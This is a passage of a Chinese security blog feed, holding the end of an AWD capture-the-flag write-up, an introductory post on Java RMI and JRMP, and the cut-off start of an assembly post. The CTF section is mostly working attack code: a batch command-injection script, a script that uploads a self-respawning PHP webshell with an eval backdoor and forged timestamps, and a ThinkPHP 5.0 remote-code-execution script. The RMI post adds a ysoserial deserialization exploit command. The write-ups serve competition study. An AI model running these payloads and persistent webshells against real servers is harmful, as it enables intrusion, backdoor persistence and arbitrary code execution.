class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</span><br><span class="line">    $str=str_replace(<span class="string">';'</span>,<span class="string">''</span>,$str);</span><br><span class="line">    $str=str_replace(<span class="string">'|'</span>,<span class="string">''</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">    $host=waf($host);</span><br><span class="line">    var_dump($host);</span><br><span class="line">    system(<span class="string">"ping -c 1 $host"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="number">1</span>]))</span><br><span class="line">    ping($_REQUEST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这个命令执行倒是挺简单的， <code>&amp;cat&lt;/flag</code> 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port = [<span class="number">30180</span>,<span class="number">30280</span>,<span class="number">30680</span>,<span class="number">30780</span>,<span class="number">30980</span>,<span class="number">31180</span>,<span class="number">31280</span>,<span class="number">31380</span>,<span class="number">31480</span>,<span class="number">31580</span>,<span class="number">31780</span>,<span class="number">31880</span>,<span class="number">31980</span>,<span class="number">32080</span>,<span class="number">32180</span>,<span class="number">32280</span>,<span class="number">32380</span>,<span class="number">32480</span>,<span class="number">31080</span>,<span class="number">30580</span>,<span class="number">30380</span>,<span class="number">30480</span>,<span class="number">30880</span>,<span class="number">31680</span>]</span><br><span class="line">url = <span class="string">'http://ip:&#123;port&#125;/common/function.php?1=&amp;cat&lt;/flag'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> port:</span><br><span class="line">    r = requests.get(url=url.format(port=str(i)))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(re.findall(<span class="string">r"(flag&#123;.*&#125;)"</span>,r.text)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h3><p>审计源码发现 <code>admin, admin</code>  即可登陆</p><p>然后有文件上传点，直接传shell.md即可解析</p><p>事后写了一个批量上传不死马的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">bs_webshell = <span class="string">"""&lt;?php</span></span><br><span class="line"><span class="string">    ignore_user_abort(true);</span></span><br><span class="line"><span class="string">    set_time_limit(0);</span></span><br><span class="line"><span class="string">    unlink(__FILE__);</span></span><br><span class="line"><span class="string">    $file = '%s';</span></span><br><span class="line"><span class="string">    $code = '&lt;?php if($_POST["pass"]=="%s")&#123;@eval($_POST[1]);&#125;?&gt;';</span></span><br><span class="line"><span class="string">    while (1) &#123;</span></span><br><span class="line"><span class="string">        file_put_contents($file, $code);</span></span><br><span class="line"><span class="string">        system('touch -m -d "2018-12-01 09:10:12" %s');</span></span><br><span class="line"><span class="string">        usleep(50);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">?&gt;"""</span></span><br><span class="line">secret = <span class="string">"pxy"</span></span><br><span class="line">shell_path = <span class="string">".pxy.php"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_hash</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateShell</span><span class="params">(ip)</span>:</span></span><br><span class="line">    pwd = md5_hash(secret + ip)</span><br><span class="line">    shell = bs_webshell % (shell_path, pwd, shell_path)</span><br><span class="line">    print(shell)</span><br><span class="line">    <span class="keyword">return</span> shell</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkShell</span><span class="params">(ip,shell_path)</span>:</span></span><br><span class="line">    url = <span class="string">'http://%s/%s'</span> % (ip, shell_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    pwd = md5_hash(secret + ip)</span><br><span class="line">    res = requests.post(url, data=&#123;<span class="string">'pass'</span>: pwd, <span class="string">'1'</span>: <span class="string">'echo(123);'</span>&#125;)</span><br><span class="line">    print(res.text)</span><br><span class="line">    <span class="keyword">if</span> res.text == <span class="string">'123'</span>:</span><br><span class="line">        print(<span class="string">'[+]'</span>+ip,<span class="string">'Check OK'</span>)</span><br><span class="line"></span><br><span class="line">ports = [<span class="number">30180</span>,<span class="number">30280</span>,<span class="number">30380</span>,<span class="number">30480</span>,<span class="number">30580</span>,<span class="number">30680</span>,<span class="number">30780</span>,<span class="number">30880</span>,<span class="number">30980</span>,<span class="number">31080</span>,<span class="number">31180</span>,<span class="number">31280</span>,<span class="number">31380</span>,<span class="number">31480</span>,<span class="number">31580</span>,<span class="number">31680</span>,<span class="number">31780</span>,<span class="number">31880</span>,<span class="number">31980</span>,<span class="number">33080</span>,<span class="number">32180</span>,<span class="number">32280</span>,<span class="number">32380</span>,<span class="number">32480</span>]</span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ports:</span><br><span class="line">    files = &#123;<span class="string">"pic"</span>:(<span class="string">'shell.md'</span>, generateShell(ip), <span class="string">'application/octet-stream'</span>)&#125;</span><br><span class="line">    cookies = dict(PHPSESSID=<span class="string">'fjue55il5q0v90fp8l66us6hq0'</span>)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://"</span>+ip+<span class="string">":"</span>+str(i)</span><br><span class="line"></span><br><span class="line">    url_upload = url+<span class="string">"/index.php?c=User&amp;a=upload"</span></span><br><span class="line">    r = requests.post(url=url_upload,files=files, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b"successfully"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        print(<span class="string">"[+]"</span>+ip+<span class="string">":"</span>+str(i)+<span class="string">" upload success"</span>)</span><br><span class="line">    </span><br><span class="line">    url_1 = url + <span class="string">"/upload/admin_shell.md"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url_1,timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        checkShell(ip, <span class="string">"upload/.pxy.php"</span>)</span><br></pre></td></tr></table></figure><p>后来研究发现，其实文件上传不仅仅是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;User&amp;a&#x3D;upload</span><br></pre></td></tr></table></figure><p>也可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;File&amp;a&#x3D;save</span><br></pre></td></tr></table></figure><p>因为 <code>index.php</code> 是这样写的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$c=<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>])?$_GET[<span class="string">'c'</span>]:<span class="string">'User'</span>;</span><br><span class="line">$a=<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'Index'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$obj=run_c($c);</span><br><span class="line">run_a($obj,$a);</span><br></pre></td></tr></table></figure><p>URL格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?c&#x3D;User&amp;a&#x3D;home</span><br></pre></td></tr></table></figure><p>就是可以调用任意类的任意方法</p><p>ps比赛的时候我们是这么想的：</p><p>看到 <code>base.php</code> 中实例化了 <code>Smarty</code> </p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584186763035.png" alt></p><p>之后看到这里有一处eval。</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584186784920.png" alt></p><p>于是就开始想能不能getshell，但是无果。</p><h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>感谢a2u13师傅</p><p>还是接前面的分析，可以执行任意类的任意方法。但是那个地方是字符串拼接！。</p><p>所以可以直接通过 <code>;</code> 进行命令注入</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584188249191.png" alt></p><p>File类需要登陆才能使用，换一个 <code>User</code>类就行</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584188382658.png" alt></p><p>比赛的时候确实没往这块想，还是要加强代码审计啊</p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;method);</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;method)(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">     $a=$_REQUEST[<span class="string">'a'</span>];</span><br><span class="line">    @unserialize($a);</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看上去挺像反序列化的，但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">($this-&gt;method)($this-&gt;args);</span><br></pre></td></tr></table></figure><p>这里是报错的，所以比赛的时候没法利用</p><p>复盘的时候才意识到原来只有php7才可以这么用</p><p>经过测试发现只能直接动态调用system函数，eval和assert都是不行的</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584191203655.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584191226590.png" alt="eval是不行的"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>web1是最后放出来的，为了提高挑战性不给ssh密码。</p><p>但是稍微看两眼就会发现是tp5.0写的，还开了debug，于是直接RCE了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">port = [<span class="number">10180</span>,<span class="number">10280</span>,<span class="number">10380</span>,<span class="number">10480</span>,<span class="number">10580</span>,<span class="number">10680</span>,<span class="number">10780</span>,<span class="number">10880</span>,<span class="number">10980</span>,<span class="number">11080</span>,<span class="number">11180</span>,<span class="number">11280</span>,<span class="number">11380</span>,<span class="number">11480</span>,<span class="number">11580</span>,<span class="number">11680</span>,<span class="number">11780</span>,<span class="number">11880</span>,<span class="number">11980</span>,<span class="number">12080</span>,<span class="number">12180</span>,<span class="number">12280</span>,<span class="number">12380</span>,<span class="number">12480</span>]</span><br><span class="line">url_flag = <span class="string">'http://ip:&#123;port&#125;/public/index.php?s=captcha'</span></span><br><span class="line">data = &#123;<span class="string">'_method'</span>:<span class="string">'__construct'</span>,</span><br><span class="line">        <span class="string">'filter[]'</span>:<span class="string">'system'</span>,</span><br><span class="line">        <span class="string">'method'</span>:<span class="string">'get'</span>,<span class="string">'get[]'</span>:<span class="string">'cat /flag'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> port:</span><br><span class="line">    r = requests.post(url=url_flag.format(port=str(i)),data=data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print((re.findall(<span class="string">r"(flag&#123;.*&#125;)"</span>,r.text)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这一波flag还是挺舒服的，但是遗憾的是没法修啊。。</p><p><img src= "/img/loading.gif" data-src="/posts/f1d265cd/1584183311879.png" alt></p><p>不过后来意识到可以直接将 <code>/var/www/html</code> 下的文件打包下载，还可以自己往里面写shell然后蚁剑连接进行修改。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI入门</title>
      <link href="/posts/aba5931d/"/>
      <url>/posts/aba5931d/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在<strong>网络上的不同计算机中,</strong>它的底层是由<strong>socket</strong>和<strong>java序列化和反序列化</strong>支撑起来的。</p><p>Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><p>我们知道远程过程调用（Remote Procedure Call, RPC）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了过程的分布能力。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供分布式对象间的通讯。</p><h3 id="如何找到类？"><a href="#如何找到类？" class="headerlink" title="如何找到类？"></a>如何找到类？</h3><p>类似DNS中域名和IP的对应关系，RMI中有一个 <strong>RMIRegistry</strong> 来提供这种对应关系，客户端通过访问 <strong>RMIRegistry</strong> 来获得对应的类进行加载</p><h3 id="数据是如何传递的？"><a href="#数据是如何传递的？" class="headerlink" title="数据是如何传递的？"></a>数据是如何传递的？</h3><p>当客户端通过RMI注册表找到一个远程接口的时候，所得到的其实是远程接口的一个动态代理对象。当客户端调用其中的方法的时候，方法的参数对象会在序列化之后，传输到服务器端。服务器端接收到之后，进行反序列化得到参数对象。并使用这些参数对象，在服务器端调用实际的方法。调用的返回值Java对象经过序列化之后，再发送回客户端。客户端再经过反序列化之后得到Java对象，返回给调用者。这中间的序列化过程对于使用者来说是透明的，由动态代理对象自动完成。</p><p>所以客户端并不是直接和服务端进行通信的，而是由客户端代理和服务端代理进行通信</p><p>如下图：RMI服务器在 <strong>RMIRegistry</strong> 中进行注册，客户端去查找，然后再进行RMI调用</p><p><img src= "/img/loading.gif" data-src="/posts/aba5931d/1584862271326.png" alt></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Hello接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Hello实现</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-03-12 22:15</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHello</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String  <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个服务端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: RMI服务器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-01-20 08:45</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        RemoteHello h = <span class="keyword">new</span> RemoteHello();</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer rmiServer = <span class="keyword">new</span> RMIServer();</span><br><span class="line">        rmiServer.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端进行访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: RMI客户端</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-01-20 08:57</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Hello hello = (Hello) Naming.lookup(<span class="string">"rmi://127.0.0.1/Hello"</span>);</span><br><span class="line">        System.out.println(hello.hello());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（最好能放在两个不同的文件夹</p><p>抓包看一些通信的数据</p><p><img src= "/img/loading.gif" data-src="/posts/aba5931d/1584863994742.png" alt></p><p>看到 return data, aced 就是java序列化后的标志</p><p><img src= "/img/loading.gif" data-src="/posts/aba5931d/1584864050735.png" alt></p><h2 id="攻击RMI服务端"><a href="#攻击RMI服务端" class="headerlink" title="攻击RMI服务端"></a>攻击RMI服务端</h2><p>这里用的java7</p><h3 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h3><blockquote><p>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。</p></blockquote><p>通俗点解释，它就是一个协议，一个在TCP/IP之上的线路层协议，一个RMI的过程，是用到JRMP这个协议去组织数据格式然后通过TCP进行传输，从而达到RMI，也就是远程方法调用</p><p>由于JRMP协议在传输过程中的数据是序列化后的，不管是服务端还是客户端，当接收到JRMP协议数据时，都会把序列化的数据进行反序列化的话，这样就可以互相对打</p><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><p>创建一个 RMI 服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 创建一个RMI服务</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-03-22 15:18</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个服务器上(其实都是在本地，只是区分一下)，存在有漏洞的Apache Common Collections库，那么就可以直接用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/aba5931d/1584864819094.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wulidecade.cn/2020/02/15/RMI%E5%85%A5%E9%97%A8/#more" target="_blank" rel="noopener">RMI入门</a></p><p><a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">一篇写的很清楚的文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jndi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编从入门到入土五</title>
      <link href="/posts/7fad3d80/"/>
      <url>/posts/7fad3d80/</url>
      
        <content type="html"><![CDATA[<h2 id="课后实验"><a href="#课后实验" class="headerlink" title="课后实验"></a>课后实验</h2><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 